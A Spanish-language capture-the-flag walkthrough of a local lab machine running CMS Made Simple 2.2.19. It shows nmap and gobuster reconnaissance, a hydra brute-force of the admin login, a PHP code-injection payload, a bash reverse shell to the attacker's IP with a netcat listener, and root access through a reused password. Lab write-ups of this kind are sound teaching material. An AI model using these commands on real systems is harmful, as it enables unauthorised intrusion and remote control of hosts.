
##### Hacemos un ping a la maquina:

```bash
ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.089 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.089/0.089/0.089/0.000 ms
```


##### Hacemos un escaneo con nmap:

```bash
nmap -p- --open -sS --min-rate 5000 -sVC -vvv -n -Pn 172.17.0.2 -oN escaneo_nmap

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d1:19:f1:fa:48:16:af:8a:4a:89:2d:78:89:e9:2d:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG36eG906mrEH+PhkX+d0kmBBpxW4ECArmbLYCP/Q3nWm464LsDcafYElms/gd6ol5iFMM3XLdWyEQiyy/MfZDM=
|   256 b8:b7:2e:64:3e:ee:c3:2e:2e:be:99:07:4e:02:4f:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL/OHCYyijgZMo6u1RkpTLxjluOVfmcqxgB3eL+iMUpp
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que tenemos el puerto 22 (SSH) y el puerto 80 (HTTP) abierto. Vamos a investigar que hay por el puerto 80.


Vemos solamente la platilla por defecto de apache. Vamos hacer algo de fuzzing web.

---

Hacemos un gobuster con los siguiente parámetros:

```bash
> gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

Vemos que no nos encuentra nada pero viendo el código fuente hasta el final vemos algo que nos puede servir, veo lo siguiente:

```bash
<!-- cms made simple is installed here - Access to it - cmsms -->
```

Vamos al navegador para usarlo y vemos que si funciona:

http://172.17.0.2/cmsms/


Nos encontramos con cms, una herramienta para poder hacer paginas web. Lo primero que debemos hacer es mirar su versión, a lo que nos encontramos esto: ***This site is powered by [CMS Made Simple](http://www.cmsmadesimple.org) version 2.2.19***

---
Buscamos en Internet algo que nos sirva, algún exploit de esta version y lo encontramos, ahora debemos hacer algunas cosas para que funcione. Vamos a hacer fuzzing de nuevo pero ahora sabiendo la existencia del cms.

```bash
> gobuster dir -u http://172.17.0.2/cmsms -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.tx 
```

/modules
/uploads          
/doc                  
/admin                
/assets               
/lib                  
/tmp

Ahora si podemos ver que nos encuentra varias cosas. Vamos a mirar en el directorio admin. Nos lleva al panel de login:


---

##### Vamos hacer un ataque de fuerza bruta al login web

Utilizamos el siguiente comando para hacerlo:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz "http-post-form://172.17.0.2/cmsms/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"
```

Es un clásico hydra solo con pequeños cambios. La ruta de **/cmsms/admin/login.php** la vemos en Burp en la parte de POST. sustituimos usuario y contraseña por lo que vemos en el comando y ponemos el mensaje de error que nos lanza cuando queremos entrar. Todo lo demás es igual.


Después de eso vemos que funciona y nos da la contraseña para poder entrar

---

Una vez que estamos dentro ahora si seguimos las instrucciones que encontramos sobre el exploit.

---
Hacemos tal cual todo y vemos que efectivamente funciona. Nos refleja el numero 49. Esto nos indica que es vulnerable a un **ssti (server side template injection)** ahora vamos a buscar algún payload que nos ayude con esto.
> *github payloads all the things ssti*


buscando encontramos algo que nos puede ayudar 
https://github.com/capture0x/CMSMadeSimple

Usamos el payload:
```
<?php echo system('id'); ?>
```

Al ejecutarlo vemos que si es vulnerable.

---
Ahora vamos hacer una reverse shell


ponemos nuestra IP, el puerto por donde queremos ponernos en escucha y copiamos y pegamos sustituyendo la parte de 'id' por esto:

```
<?php echo system('bash -c "bash -i >& /dev/tcp/10.0.2.15/443 0>&1"'); ?>
```

Tiene unos pequeños ajustes para que funcione. Antes de ejecutarlo nos ponemos en escucha por el puerto 443 de la siguiente manera:

```
nc -lvnp 443 
```
![[lsito.png]]Listo, estamos dentro.

---

### Tratamiento de la TTY


mi ubico en la raíz
```bash
cd /
```

enter:
```bash
script /dev/null -c bash
```

enter:
```bash
pongo ctrl + z
```

enter:
```bash
stty raw -echo; fg
```

enter:
```bash
reset xterm
```

después creo dos variables de entorno que son:

```bash
export SHELL=bash
export TERM=xterm
```

y listo ya quedo, puedo usar bien clear, ctrl + c y no se pierde conexión.

---
 Una vez terminado eso intentamos reutilizar primero que nada la contraseña que ya se había usado anteriormente:**chocolate**
 y vaya sorpresa, logramos ser root.

---
